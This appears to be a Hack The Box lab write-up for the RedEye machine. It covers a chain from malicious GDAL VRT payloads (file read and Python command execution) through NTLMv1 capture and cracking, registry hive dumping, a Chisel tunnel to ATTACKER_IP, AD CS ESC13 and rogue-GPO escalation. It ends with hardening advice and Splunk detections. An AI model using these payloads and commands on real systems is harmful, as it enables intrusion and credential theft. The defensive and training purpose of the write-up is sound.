Executive Summary

RedEye exposed a small public attack surface, but the visible web application was only the entry point into a multi-stage compromise. The successful path crossed unsafe geospatial file processing, Rocket.Chat integration abuse, legacy NTLM authentication, Windows credential access, an SSH pivot, Active Directory Certificate Services and delegated Group Policy permissions.

The initial weakness was the processing of attacker-controlled GDAL Virtual Raster files. A crafted VRTRawRasterBand referenced an arbitrary local file, providing a file-read primitive. A second VRT used an inline Python pixel function, which the server executed as the geospatial processing account. This converted a data-ingestion feature into operating-system command execution and exposed Rocket.Chat integration secrets.

The compromised chat identity could communicate with an automated link-review workflow used by an IT operator. A believable link caused the victim workstation to authenticate to attacker-controlled infrastructure. A legacy Group Policy setting permitted NetNTLMv1, making the captured response recoverable. The resulting credential material provided local-administrator access to WKSTN01, where registry hives and an autologon password yielded both the user flag and a durable SSH login to the Linux edge host.

The SSH session became the internal pivot. Active Directory enumeration identified an AD CS ESC13 condition: the GroupPolicy_Audit certificate template included an issuance-policy OID linked to the GPO-Auditors group. Authenticating with a certificate issued from that template caused the privileged group SID to be added to the Kerberos authorization data. That group had WriteGPLink over the IT organisational unit.

The final escalation abused that delegated right. A controlled machine account, DNS record and service principal names supported a rogue Group Policy source. A malicious user scheduled task was linked to the IT OU and retrieved through attacker-controlled LDAP and SMB services. When policy refreshed during an Isabel RDP session on DC01, the task ran in the required context and added the compromised Gabby account to the domain controller's local Administrators group. Administrative SMB access then exposed the root flag.

The compromise was not a single-vulnerability failure. It depended on several controls failing together:

  1. Untrusted VRT content reached a privileged GDAL pipeline.
  2. Inline Python pixel functions and raw raster access were enabled.
  3. Application secrets were readable by the processing identity.
  4. A human chat identity and automated integration shared excessive trust.
  5. A legacy policy allowed NTLMv1.
  6. A domain identity had local-administrator access and a recoverable autologon secret.
  7. SSH password authentication accepted domain credentials on the edge host.
  8. AD CS issuance policy granted an authorisation group through ESC13.
  9. WriteGPLink was delegated over a sensitive OU.
  10. Domain systems could obtain policy material from unapproved LDAP and SMB servers.

2. Unsafe Geospatial Ingestion

2.1 Arbitrary file read with VRTRawRasterBand

GDAL's Virtual Raster format is XML that describes how GDAL should source and transform raster data. A VRT is therefore not a passive image. It can instruct GDAL to read other files and, where unsafe capabilities are enabled, execute Python pixel functions.

The first proof of concept used VRTRawRasterBand and an absolute SourceFilename:

<VRTDataset rasterXSize="512" rasterYSize="1">
  <SRS>EPSG:4326</SRS>
  <GeoTransform>0,1,0,0,0,-1</GeoTransform>
  <VRTRasterBand dataType="Byte" band="1" subClass="VRTRawRasterBand">
    <SourceFilename relativeToVRT="0">/etc/airport-gis/notify.env</SourceFilename>
    <ImageOffset>0</ImageOffset>
    <PixelOffset>1</PixelOffset>
    <LineOffset>512</LineOffset>
    <ByteOrder>LSB</ByteOrder>
  </VRTRasterBand>
</VRTDataset>

When the ingestion service opened the VRT, GDAL read the referenced local file as if it were raster data. The returned or generated output confirmed access to a host-side environment file.

This was the first decisive finding: the upload pipeline allowed an attacker to turn a filename inside untrusted XML into a local file read. The issue was broader than one file path. Any readable file within the service account's namespace was potentially exposed.

2.2 Command execution with an inline Python pixel function

A second VRT used VRTDerivedRasterBand with a Python pixel function. The test command wrote the current identity to a temporary file and copied an application environment file into a readable location:

<VRTDataset rasterXSize="1" rasterYSize="1">
  <VRTRasterBand dataType="Byte" band="1" subClass="VRTDerivedRasterBand">
    <PixelFunctionType>redeye</PixelFunctionType>
    <PixelFunctionLanguage>Python</PixelFunctionLanguage>
    <PixelFunctionCode><![CDATA[
import os
def redeye(in_ar, out_ar, xoff, yoff, xsize, ysize,
           raster_xsize, raster_ysize, buf_radius, gt, **kwargs):
    os.system(
        "id > /tmp/gisops-pixel-id; "
        "cp /etc/rocketchat.env /tmp/rocketchat.env; "
        "chmod 0644 /tmp/gisops-pixel-id /tmp/rocketchat.env"
    )
    out_ar[:] = 1
    return 0
    ]]></PixelFunctionCode>
  </VRTRasterBand>
</VRTDataset>

The ingestion worker executed the function as the gisops account. This confirmed operating-system command execution and exposed the Rocket.Chat integration configuration.

For repeatable interaction, the same primitive created a UNIX-domain command socket under the geospatial spool directory. A small Python service accepted a command, executed it through the shell and returned stdout and stderr. That avoided repeatedly uploading one-command VRT files while the foothold was being investigated.

2.3 Why this worked

The pipeline combined three unsafe conditions:

  • untrusted VRT content was accepted;
  • VRTRawRasterBand could reference arbitrary paths; and
  • inline Python pixel functions were executable.

GDAL's own security guidance warns that raw VRT bands can read arbitrary accessible files and that Python VRT pixel functions can execute hostile code. The relevant controls are GDAL_VRT_ENABLE_PYTHON, GDAL_VRT_ENABLE_RAWRASTERBAND and GDAL_VRT_RAWRASTERBAND_ALLOWED_SOURCE. See the GDAL VRT documentation and GDAL security guidance.

3. Rocket.Chat Trust Abuse

The exposed environment data contained the credentials or token used by a Rocket.Chat integration. The integration operated as Gabby T, a geospatial platform engineer and member of the GeoNetwork administration group.

The chat history provided important organisational context:

  • GeoNetwork was known to be outdated.
  • A legacy change request had enabled older Windows authentication for a webhook workflow.
  • Owen F was an IT operator.
  • Links sent from Gabby's identity were automatically reviewed from Owen's workstation.
  • Isabel's temporary credential had been discussed in chat.

Secrets and message content are not reproduced here. The key issue was trust concentration: a token recovered from the geospatial service represented a human-looking identity, and an automated workflow treated links from that identity as trusted.

I sent Owen a plausible message framed as an AODB decommissioning report. The referenced web page was hosted on the attacker machine. The victim workflow fetched the page and then attempted to load an attacker-controlled authentication resource.

The resulting sequence was:

        |

This aligns with MITRE ATT&CK T1187, Forced Authentication.

4. NetNTLMv1 Recovery

Responder was configured with a fixed eight-byte server challenge before Owen's workstation authenticated to the attacker host:

[Responder Core]
Challenge = 1122334455667788
sudo responder -I <VPN_INTERFACE> -v

The challenge above is an illustrative value, not a claim about the redacted capture from this run. Use the challenge recorded in your own Responder log. The capture belonged to Owen F and used NetNTLMv1. Responder captured a challenge and response, not an NT hash that could be passed directly to SMB. Preserve the complete line, including the LM response and server challenge:

Owen.F::AIRWAYS:<LM_RESPONSE>:<NT_RESPONSE>:<CHALLENGE>

4.1 Recovering the NT hash

The exact recovery command line from the assessment was not retained. The following is a reproducible equivalent using ntlmv1-multi and Hashcat. The tool handles both ordinary NetNTLMv1 and NetNTLMv1 with extended session security (ESS); do not substitute an example challenge into a capture you already have.

git clone https://github.com/evilmog/ntlmv1-multi.git
cd ntlmv1-multi
uv run ntlmv1_nextgen.py --ntlmv1 'Owen.F::AIRWAYS:<LM_RESPONSE>:<NT_RESPONSE>:<CHALLENGE>' --hashcat

Copy the two ciphertext:challenge lines printed under “To crack with hashcat” into 14000.hash, one per line. The tool calculates the effective challenge for ESS captures. Set <HASHCAT_DIR> to the directory containing Hashcat's charsets/DES_full.hcchr file. Hashcat mode 14000 then recovers the first two DES keys:

hashcat -m 14000 -a 3 -1 <HASHCAT_DIR>/charsets/DES_full.hcchr --hex-charset \
  --potfile-path des.pot 14000.hash '?1?1?1?1?1?1?1?1'

After both lines are recovered, point the tool at the potfile. It converts the DES keys back to the first 14 bytes of the NT hash, derives the final two bytes from the third response block, and prints the complete 32-hex-character value as NTLM:

uv run ntlmv1_nextgen.py --ntlmv1 'Owen.F::AIRWAYS:<LM_RESPONSE>:<NT_RESPONSE>:<CHALLENGE>' --potfile des.pot

This recovers the NT hash without finding Owen's plaintext password. A wordlist attempt with hashcat -m 5500 attacks the NetNTLMv1 capture for the password instead; it is a different route and may fail even when DES-key recovery succeeds. GPU acceleration reduced the DES search time in this assessment, but the time needed depends on the available hardware.

After recovery, the NT hash was tested against WKSTN01 with pass-the-hash authentication:

nxc smb 192.168.100.3 -d AIRWAYS -u 'Owen.F' -H '<NT_HASH>'

The result showed local-administrator access. The raw response, challenge, recovered hash and password remain redacted. The security boundary had already failed when a domain workstation sent a recoverable NetNTLMv1 response to an untrusted destination.

5. WKSTN01 Compromise and the User Flag

Administrative SMB access allowed the SAM, SYSTEM and SECURITY registry hives to be saved and extracted:

reg save HKLM\SAM C:\Windows\Temp\SAM.hive /y
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.hive /y
reg save HKLM\SECURITY C:\Windows\Temp\SECURITY.hive /y

Offline parsing recovered:

  • the local Administrator NT hash;
  • cached domain logon material;
  • the workstation machine-account secret; and
  • a DefaultPassword value containing Owen's autologon password.

All values are redacted.

The user flag was read from:

C:\Users\Administrator\Desktop\user.txt

The flag is deliberately omitted. The accepted value changed when the HTB instance was restarted, so the current file was read again before final submission.

The recovered Owen password also authenticated to SSH on the public Linux gateway:

ssh 'Owen.F@<TARGET_IP>'

This was the meaning of the foothold hint that there were more services than the web application. Port 22 was not a distraction; it became the reliable path into the environment.

6. Internal Pivot

Chisel provided a reverse SOCKS tunnel from the gateway:

On the attacker host:

./chisel server --reverse --port 9002

On the compromised gateway:

/tmp/chisel client <ATTACKER_IP>:9002 R:1083:socks

Proxychains was configured with:

socks5 127.0.0.1 1083

Internal tools could then reach DC01 and WKSTN01:

proxychains4 nmap -sT -Pn -p53,88,135,389,445,464,636,3268,3389,5985 192.168.100.1
proxychains4 nmap -sT -Pn -p135,139,445,3389,5985 192.168.100.3

After one machine reset, GeoNetwork's ADFS/OIDC authentication provided an alternative way to restore the Linux execution path. Gabby's domain credential authenticated to the GeoNetwork administration interface. A custom XSL formatter called Java Runtime execution to download and start the tunnel bootstrap script. This was operationally useful, but it did not change the underlying root cause: administrative application functionality could reach an unsafe execution primitive.

8. AD CS ESC13

ESC13 occurs when a certificate issuance policy object is linked to an Active Directory group through msDS-OIDToGroupLink. If a user obtains a certificate containing that policy and authenticates with it, the group may be represented in the resulting Kerberos authorisation data.

The GroupPolicy_Audit template was therefore not merely an audit certificate. It acted as a path into a group that could modify which Group Policy Objects applied to the IT OU.

Isabel's temporary credential was expired and required a password change. The password was changed through SAMR to a lab-controlled value, after which the template was enrolled. The resulting PFX, private key and password are not included.

Linux Schannel LDAP authentication did not reproduce the required authorisation token. Native Windows PKINIT did. Rubeus was used on WKSTN01:

Rubeus.exe asktgt /user:Isabel.O /domain:airways.htb /dc:192.168.100.1 ^
  /certificate:<CERTIFICATE_THUMBPRINT> /nowrap ^
  /outfile:C:\Windows\Temp\isabel.kirbi

The resulting Kerberos ticket was converted to ccache format for use through the SOCKS pivot. The ticket's authorisation data confirmed the GPO-Auditors group entitlement.

The distinction mattered. Possessing a certificate was not enough; authentication had to use a path that caused the KDC to construct the expected privilege-bearing token.

9. GPO-Link Abuse and DC01 Compromise

9.1 Preparing a Kerberos-aware rogue policy source

A machine account named REDGPO2$ was created using the domain's default MachineAccountQuota. LDAP and HOST service principal names were added, and an AD-integrated DNS record mapped redgpo2.airways.htb to the attacker VPN address.

No machine password, NT hash or AES key is included in this report.

OUned was used to host:

  • a fake LDAP service on TCP 389 serving the Group Policy Container view;
  • a fake SMB service on TCP 445 serving the Group Policy Template files; and
  • a malicious user Group Policy Preference scheduled task.

The scheduled task's action was equivalent to:

net localgroup Administrators AIRWAYS\Gabby.T /add

The policy was configured as a user policy because the available privileged user session was Isabel's RDP logon on DC01.

An implementation detail was critical: DC01 requested an AES-encrypted LDAP service ticket for the machine account. Supplying only the machine account's NT/RC4 key did not work. The correct Kerberos salt was derived, the AES256 key was generated, and pre-authentication was verified before the fake service was restarted.

9.2 Linking the malicious policy

The ESC13-derived GPO-Auditors token was used to modify the gPLink attribute on the IT OU. This did not require modifying a legitimate production GPO. Instead, it caused the target OU to reference the attacker-controlled policy.

This technique maps to MITRE ATT&CK T1484.001, Group Policy Modification.

9.3 Triggering policy processing

Isabel logged on to DC01 over RDP. From SConfig, option 15 opened a command shell and policy processing was forced:

gpupdate /force

DC01 contacted the rogue LDAP service for policy metadata and the rogue SMB service for the corresponding GPT. It retrieved:

User\Preferences\ScheduledTasks\ScheduledTasks.xml

The scheduled task executed and added AIRWAYS\Gabby.T to DC01's local Administrators group.

Administrative SMB access then succeeded:

nxc smb 192.168.100.1 -d AIRWAYS -u 'Gabby.T' -p '<REDACTED>' \
  --exec-method smbexec -x 'type C:\Users\Administrator\Desktop\root.txt'

The root flag was read from:

C:\Users\Administrator\Desktop\root.txt

The root flag is intentionally omitted. Both current-instance flags were accepted by Hack The Box.

10. Cleanup Performed

The following cleanup actions were completed:

  • Gabby was removed from DC01's local Administrators group.
  • The malicious gPLink value on the IT OU was restored.
  • OUned's LDAP and SMB services were stopped.
  • The RDP session, Chisel tunnel and temporary file server were stopped.
  • Temporary execution processes were terminated where access permitted.

The REDGPO2$ machine-account object could not be deleted with the available directory permission and remained until the disposable HTB lab was reset. This is recorded rather than claiming complete cleanup.

11. Dead Ends and What They Taught

11.1 AODB ingestion SQL injection

The aodb-ingest.sh path and a possible SQL injection initially looked promising, especially after notify.env was identified. It was not the successful route. The reliable primitive came directly from unsafe VRT parsing: VRTRawRasterBand for file read and VRTDerivedRasterBand with inline Python for code execution.

The lesson is to validate the exact data-processing boundary before assuming the backing database is the primary target. In this case the file parser was more privileged and more directly exploitable than the application query path.

11.2 Treating the recovered hash as the final goal

Recovering Owen's NT hash was useful, but spending too long treating password cracking as the whole foothold would have obscured the larger trust chain. The hash was a bridge into WKSTN01. The valuable outcomes were the local-administrator session, autologon password, user flag and SSH access.

11.3 Focusing only on web services

The web application delivered code execution, but SSH supplied stability. The hint that there were more services than web was literal. A complete service inventory should remain in view throughout exploitation, not just during the first scan.

11.4 Assuming certificate authentication paths were equivalent

Schannel LDAP authentication and PKINIT did not produce identical effective authorisation. Native Windows PKINIT through Rubeus caused the KDC to issue a ticket with the group entitlement required for WriteGPLink. Testing the resulting token was more important than assuming the certificate's presence guaranteed the privilege.

11.5 Using only the machine account's RC4 key

The rogue LDAP service initially failed because the DC requested AES. Deriving and validating the machine account's AES256 key resolved the Kerberos service-ticket issue. When a Kerberos-backed service fails, the negotiated encryption type, SPN, hostname, DNS and clock should all be checked before changing the overall attack path.

12.1 Secure the GDAL processing pipeline

For any service that processes untrusted geospatial data:

  • Set GDAL_VRT_ENABLE_PYTHON=NO.
  • Disable raw VRT bands where possible with GDAL_VRT_ENABLE_RAWRASTERBAND=NO.
  • If raw bands are required, set GDAL_VRT_RAWRASTERBAND_ALLOWED_SOURCE to a dedicated, non-sensitive input root.
  • Reject VRTDerivedRasterBand, PixelFunctionLanguage=Python, inline PixelFunctionCode and absolute SourceFilename values at upload validation.
  • Allowlist only the file formats and GDAL drivers the service genuinely requires.
  • Run conversion in a short-lived container or sandbox under a dedicated, unprivileged identity.
  • Mount only the submitted job directory; do not mount application configuration, SSH keys, tokens or host secrets.
  • Use a read-only root filesystem, seccomp/AppArmor or SELinux, strict CPU and memory limits and no-new-privileges.
  • Deny network egress from conversion workers unless a documented workflow requires it.
  • Use private per-job spool directories with unpredictable identifiers and restrictive permissions.
  • Do not pass user-controlled GDAL configuration flags or driver paths to command-line tools.
  • Log the submitted format, detected driver, VRT elements, child processes, file opens and outbound connections.

These recommendations follow GDAL's security guidance, which specifically warns about untrusted VRT raw bands and Python pixel functions.

12.2 Protect application secrets and integration identities

  • Move Rocket.Chat and service credentials out of flat environment files into a managed secret store.
  • Use short-lived tokens where the product supports them.
  • Give the ingestion account access only to job data, not chat integrations or unrelated application configuration.
  • Use a dedicated bot identity that cannot be mistaken for a human engineer.
  • Restrict the bot to required rooms and message actions.
  • Rotate the integration token immediately after suspected exposure and revoke active sessions.
  • Do not automatically open or render untrusted links merely because a trusted sender posted them.
  • Apply URL allowlists, external-link interstitials and isolated browser sessions to automated link review.
  • Prevent review workers from sending Windows integrated authentication to arbitrary hosts.

12.3 Remove NTLMv1 and forced-authentication paths

  • Configure Network security: LAN Manager authentication level to Send NTLMv2 responses only. Refuse LM & NTLM after compatibility testing.
  • Audit NTLM use, identify legacy dependencies and then restrict NTLM through domain policy.
  • Block outbound TCP 139 and 445 and UDP 137 at workstation, server and perimeter firewalls except to approved internal file services.
  • Disable the WebClient service where WebDAV is not required.
  • Use SMB signing and Extended Protection for Authentication where supported.
  • Prevent browsers and automation workers from automatically forwarding integrated credentials to untrusted zones.
  • Alert on NTLM authentication to internet, VPN-client or non-server address space.

Microsoft documents the policy levels and their effects in Network security: LAN Manager authentication level.

12.4 Harden workstations and local administration

  • Remove ordinary domain identities from local Administrators.
  • Use Windows LAPS for unique, rotated local Administrator passwords.
  • Remove AutoAdminLogon and DefaultPassword values.
  • Enable Credential Guard where supported.
  • Disable Remote Registry unless explicitly required.
  • Restrict remote service creation, ADMIN$ access and WMI to administrative management networks.
  • Apply WDAC or AppLocker controls to block unapproved tools such as Chisel, Rubeus and unsigned binaries.
  • Audit process creation with command lines and deploy Sysmon with tuned ProcessCreate, NetworkConnect, FileCreate, RegistryEvent and DNSQuery coverage.

12.5 Harden SSH and the edge host

  • Disable password authentication and require managed SSH keys or hardware-backed authentication.
  • Restrict SSH with AllowGroups and a dedicated administrative group.
  • Place SSH behind a management VPN or bastion rather than exposing it to every application user.
  • Do not map broad Active Directory groups into Linux login rights.
  • Require MFA for privileged remote access.
  • Prevent the DMZ host from initiating arbitrary connections to domain controllers and workstations.
  • Separate web workloads, ingestion workers and administrative access onto different identities and security boundaries.

12.6 Remediate AD CS ESC13

  • Inventory issuance-policy OIDs and every msDS-OIDToGroupLink value.
  • Remove the GroupPolicy_Audit OID-to-GPO-Auditors link unless it has an exceptional, documented business requirement.
  • Treat any linked group as a privileged group and apply Tier 0 controls if it can affect domain policy.
  • Restrict template enrolment to a small, dedicated group.
  • Remove broad Enrol rights and avoid combining low-privilege enrolment with privileged issuance policies.
  • Require certificate manager approval or authorised signatures for genuinely privileged templates.
  • Use short certificate validity periods and revoke certificates issued through the vulnerable configuration.
  • Audit template, CA, OID and group-link changes.
  • Forward AD CS Security events 4886, 4887 and 4888 to the SIEM.
  • Monitor Kerberos event 4768 for PKINIT certificate details and unusual certificate-based TGT requests.

Microsoft recommends focused AD CS monitoring including events 4886 and 4887 in Secure, delegate and audit AD CS administration.

12.7 Restrict machine accounts, DNS and SPNs

  • Set ms-DS-MachineAccountQuota to zero unless users genuinely need self-service domain join.
  • Use a controlled provisioning service for workstation and server joins.
  • Alert on Security event 4741 when the creator is not an approved provisioning identity.
  • Monitor changes to servicePrincipalName and dNSHostName with Directory Service Change auditing and appropriate SACLs.
  • Limit who can create AD-integrated DNS records.
  • Detect new computer objects followed rapidly by SPN, DNS and service-ticket activity.

12.8 Protect Group Policy and Tier 0

  • Remove unnecessary WriteGPLink, WriteDACL and GenericWrite delegations from sensitive OUs.
  • Manage GPOs from privileged access workstations using separate Tier 0 identities.
  • Apply change control and peer review to GPO creation, link changes and preference files.
  • Enable Audit Directory Service Changes and configure SACLs so event 5136 records gPLink modifications.
  • Monitor SYSVOL and Group Policy Preference XML changes.
  • Permit LDAP, LDAPS, SMB and Kerberos service traffic only to approved domain controllers and management servers.
  • Alert when a domain controller or managed endpoint connects to TCP 389 or 445 on a non-DC address.
  • Restrict RDP access to domain controllers to approved administrative groups and PAWs.
  • Monitor RDP logons followed by gpupdate, GPO changes, scheduled-task creation or local-group modification.

14. Splunk Detections

These searches use common Splunk field names. In production, map them to the Splunk Add-on for Microsoft Windows or the Endpoint data model, validate field extraction and add allowlists for approved administrative activity.

14.1 Successful NTLMv1 network logon

index=windows sourcetype="XmlWinEventLog:Security" EventCode=4624
| eval logon_type=coalesce(Logon_Type, LogonType)
| eval auth_package=coalesce(Authentication_Package, AuthenticationPackageName)
| eval ntlm_version=coalesce(LmPackageName, Package_Name__NTLM_only_, PackageName)
| where logon_type=3 AND auth_package="NTLM"
    AND match(ntlm_version, "(?i)NTLM V1")
| stats count min(_time) as firstTime max(_time) as lastTime
    values(IpAddress) as src_ip values(WorkstationName) as workstation
    by host TargetDomainName TargetUserName ntlm_version
| convert ctime(firstTime) ctime(lastTime)

Severity should be high because NTLMv1 should not appear in a modern domain. Also ingest Microsoft-Windows-NTLM/Operational and alert on legacy protocol use even when the logon fails.

14.2 Outbound SMB forced authentication to an unapproved destination

index=windows sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
  EventCode=3 (DestinationPort=139 OR DestinationPort=445)
| where NOT (
    cidrmatch("10.0.0.0/8", DestinationIp)
    OR cidrmatch("172.16.0.0/12", DestinationIp)
    OR cidrmatch("192.168.0.0/16", DestinationIp)
  )
| stats count values(Image) as process values(User) as user
    min(_time) as firstTime max(_time) as lastTime
    by Computer DestinationIp DestinationPort
| convert ctime(firstTime) ctime(lastTime)

For organisations with public or partner SMB services, replace the private-address check with an approved-destination lookup.

14.3 NTLM downgrade registry modification

index=windows sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
  EventCode=13 TargetObject="*\\Control\\Lsa\\LmCompatibilityLevel"
| where match(Details, "(?i)(DWORD \\(0x0000000[0-2]\\)|^0$|^1$|^2$)")
| table _time Computer User Image TargetObject Details

The Elastic prebuilt detection for an NTLMv1 downgrade provides a useful cross-platform reference.

14.4 Registry hive dumping

| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    values(Processes.process) as process
  from datamodel=Endpoint.Processes
  where Processes.process_name=reg.exe
    (Processes.process="* save HKLM\\SAM *"
     OR Processes.process="* save HKLM\\SYSTEM *"
     OR Processes.process="* save HKLM\\SECURITY *")
  by Processes.dest Processes.user Processes.parent_process_name
| rename Processes.* as *
| convert ctime(firstTime) ctime(lastTime)

Also detect file creation of SAM.hive, SYSTEM.hive and SECURITY.hive outside approved backup paths.

14.5 Chisel reverse SOCKS activity

| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    values(Processes.process) as process
  from datamodel=Endpoint.Processes
  where (Processes.process_name=chisel OR Processes.process_name=chisel.exe)
    Processes.process="* client *"
    (Processes.process="*R:*socks*" OR Processes.process="*reverse*" OR Processes.process="*socks*")
  by Processes.dest Processes.user Processes.parent_process_name
| rename Processes.* as *
| convert ctime(firstTime) ctime(lastTime)

Pair this with network detections for long-lived outbound connections from a server process to an internet or VPN-client address.

14.6 New machine account created by an unusual principal

index=windows sourcetype="XmlWinEventLog:Security" EventCode=4741
| eval creator=SubjectDomainName."\\".SubjectUserName
| where NOT match(creator, "(?i)^(AIRWAYS\\\\(Join-Service|SCCM-Join|DC[0-9]+\\$)|NT AUTHORITY\\\\SYSTEM)$")
| table _time host creator TargetDomainName TargetUserName
    SamAccountName DnsHostName

Replace the example allowlist with approved domain-join identities. Correlate the event with 4742 changes and subsequent servicePrincipalName or dNSHostName modification.

14.7 Sensitive Active Directory attribute modification

index=windows sourcetype="XmlWinEventLog:Security" EventCode=5136
  AttributeLDAPDisplayName IN
    ("gPLink","servicePrincipalName","dNSHostName","msDS-OIDToGroupLink")
| eval actor=SubjectDomainName."\\".SubjectUserName
| stats values(OperationType) as operation values(AttributeValue) as value
    min(_time) as firstTime max(_time) as lastTime
    by host actor ObjectDN ObjectClass AttributeLDAPDisplayName CorrelationID
| convert ctime(firstTime) ctime(lastTime)

Event 5136 commonly records deletion and addition as separate events. CorrelationID and a short time window should be used to reconstruct the complete change.

14.8 Rare or privileged AD CS certificate issuance

index=windows sourcetype="XmlWinEventLog:Security" EventCode IN (4886,4887,4888)
| eval requester=coalesce(Requester, SubjectUserName)
| eval template=coalesce(CertificateTemplate, CertificateTemplateName, Attributes)
| where EventCode=4887 AND (
    match(template, "(?i)GroupPolicy_Audit")
    OR NOT match(template, "(?i)^(User|Computer|WebServer|DomainController)$")
  )
| table _time host EventCode requester template RequestId Subject SerialNumber

The generic production version should use a lookup of approved templates and expected requester groups rather than relying only on the lab template name.

14.9 Certificate-based Kerberos TGT request

index=windows sourcetype="XmlWinEventLog:Security" EventCode=4768
| eval cert_thumbprint=coalesce(CertThumbprint, CertificateThumbprint)
| eval cert_issuer=coalesce(CertIssuerName, CertificateIssuerName)
| where isnotnull(cert_thumbprint) AND cert_thumbprint!="-"
| stats count values(IpAddress) as src_ip values(cert_issuer) as issuer
    values(CertSerialNumber) as serial
    by host TargetDomainName TargetUserName cert_thumbprint PreAuthType

Baseline legitimate smart-card and Windows Hello for Business activity. Alert when an identity that does not normally use certificate authentication requests a TGT shortly after a rare template issuance.

14.10 GPO scheduled-task file access

index=windows sourcetype="XmlWinEventLog:Security" EventCode=5145
  ShareName="*\\SYSVOL"
  RelativeTargetName="*\\Policies\\*\\Preferences\\ScheduledTasks\\ScheduledTasks.xml"
| stats count min(_time) as firstTime max(_time) as lastTime
    values(IpAddress) as src_ip values(AccessList) as access
    by host SubjectDomainName SubjectUserName ShareName RelativeTargetName
| convert ctime(firstTime) ctime(lastTime)

This follows Splunk's published Scheduled Task Created in Windows Task Scheduler by GPO analytic. In this attack the policy source was not a legitimate SYSVOL host, so the next network detection is essential.

14.11 LDAP or SMB from a managed host to a non-DC server

Maintain an approved_domain_services.csv lookup containing dest_ip values for domain controllers and authorised policy servers:

index=windows sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
  EventCode=3 DestinationPort IN (389,445,636,3268,3269)
| lookup approved_domain_services.csv dest_ip AS DestinationIp OUTPUT dest_ip AS approved
| where isnull(approved)
| stats count values(Image) as process values(User) as user
    min(_time) as firstTime max(_time) as lastTime
    by Computer DestinationIp DestinationHostname DestinationPort
| convert ctime(firstTime) ctime(lastTime)

This is one of the highest-value detections for the final stage because a domain controller retrieving policy from a VPN-client or workstation address should be exceptional.

14.12 Addition to the local Administrators group

index=windows sourcetype="XmlWinEventLog:Security" EventCode=4732
  TargetUserName="Administrators"
| eval actor=SubjectDomainName."\\".SubjectUserName
| eval member=coalesce(MemberName, MemberSid)
| table _time host actor member TargetDomainName TargetUserName

On a domain controller, any unexpected 4732 addition to Administrators should be treated as high severity.

14.13 RDP, forced Group Policy refresh and privilege change correlation

index=windows sourcetype="XmlWinEventLog:Security"
  (EventCode=4624 Logon_Type=10)
  OR (EventCode=4688 NewProcessName="*\\gpupdate.exe")
  OR (EventCode=4732 TargetUserName="Administrators")
| transaction host maxspan=15m startswith=(EventCode=4624) endswith=(EventCode=4732)
| search eventcount>=3
| table _time host duration TargetUserName IpAddress NewProcessName
    MemberName SubjectUserName

For large environments, implement this as a correlation search or risk-based analytic rather than using transaction over a broad index.

14.14 SMBExec-style transient service execution

index=windows
  ((sourcetype="XmlWinEventLog:Security" EventCode=4697)
   OR (sourcetype="XmlWinEventLog:System" EventCode=7045))
| eval service_cmd=coalesce(ServiceFileName, ImagePath)
| where match(service_cmd, "(?i)(cmd\\.exe.*\\/Q.*\\/c|%COMSPEC%|\\\\ADMIN\\$|\\\\C\\$)")
| table _time host SubjectUserName ServiceName service_cmd StartType

16. High-Confidence Correlation Strategy

Individual alerts will produce noise in a mature environment. The following sequence should be treated as a high-confidence attack story:

  1. VRT upload contains VRTRawRasterBand, PixelFunctionLanguage or PixelFunctionCode.
  2. The ingestion worker reads an environment file or starts a shell/interpreter.
  3. A Rocket.Chat integration sends a link to an IT user.
  4. The user workstation connects to an unapproved SMB, WebDAV or HTTP destination and uses NTLM.
  5. NTLMv1 appears in event 4624 or NTLM Operational telemetry.
  6. reg.exe saves SAM, SYSTEM or SECURITY.
  7. A server runs Chisel or establishes a long-lived reverse tunnel.
  8. Event 4741 creates a machine account outside the provisioning workflow.
  9. Event 4887 issues a certificate from a rare template.
  10. Event 4768 records certificate-based TGT authentication for an unusual user.
  11. Event 5136 changes gPLink, an SPN, dNSHostName or msDS-OIDToGroupLink.
  12. A domain controller connects to LDAP or SMB on a non-DC host.
  13. gpupdate /force runs after an RDP logon.
  14. Event 4732 adds a domain user to local Administrators.
  15. Event 4697 or 7045 shows transient remote service execution.

A risk-based alert should accumulate entity risk on the user, source host, destination host, certificate template and modified OU. A single path spanning five or more of these behaviours should trigger incident response even when each individual analytic is below its alert threshold.

17. Incident-Response Actions for This Exact Chain

If this activity occurred in a real environment:

  1. Isolate the geospatial worker, Linux gateway, affected workstation and domain controller while preserving memory and logs.
  2. Disable or revoke the exposed Rocket.Chat integration and rotate every secret readable by the ingestion identity.
  3. Disable the compromised user accounts and invalidate active sessions.
  4. Block attacker IPs and outbound SMB/WebDAV.
  5. Revoke the issued certificate and publish updated CRLs.
  6. Remove the vulnerable template from issuance until its enrolment and issuance-policy configuration is corrected.
  7. Inspect all msDS-OIDToGroupLink values and privileged issuance policies.
  8. Remove rogue computer, DNS and SPN objects.
  9. Restore the affected OU's gPLink from a known-good value and review every linked GPO.
  10. Inspect SYSVOL, Group Policy Preferences, scheduled tasks, services and local group membership on all systems in the OU.
  11. Rotate local administrator credentials through LAPS and reset affected domain credentials.
  12. Review CA events 4886-4888 and Kerberos 4768 activity for additional certificate abuse.
  13. Review events 4741/4742 and directory changes for other attacker-created machine accounts.
  14. Hunt for Chisel, Rubeus, registry hive exports, ADMIN$ execution and unauthorised RDP.
  15. Rebuild systems where credential-theft or Tier 0 compromise cannot be confidently scoped.

19. Conclusion

RedEye rewarded viewing the environment as a connected trust system rather than a collection of isolated vulnerabilities. The public web application exposed the first primitive, but the compromise depended on how the geospatial worker, chat integration, Windows authentication, Linux SSH, AD CS and Group Policy delegations interacted.

The strongest defensive lesson is that no single product control would have been sufficient. Disabling unsafe GDAL features would have prevented initial access. Removing NTLMv1 or blocking outbound SMB would have stopped credential capture. LAPS and removal of autologon secrets would have limited the workstation compromise. Restricting SSH would have removed the stable pivot. Correcting ESC13 or WriteGPLink would have stopped domain escalation. Allowlisting LDAP and SMB policy servers would have prevented DC01 from retrieving the rogue policy.

Both flags were obtained and submitted successfully. Their values and all reusable secrets remain redacted from this report.
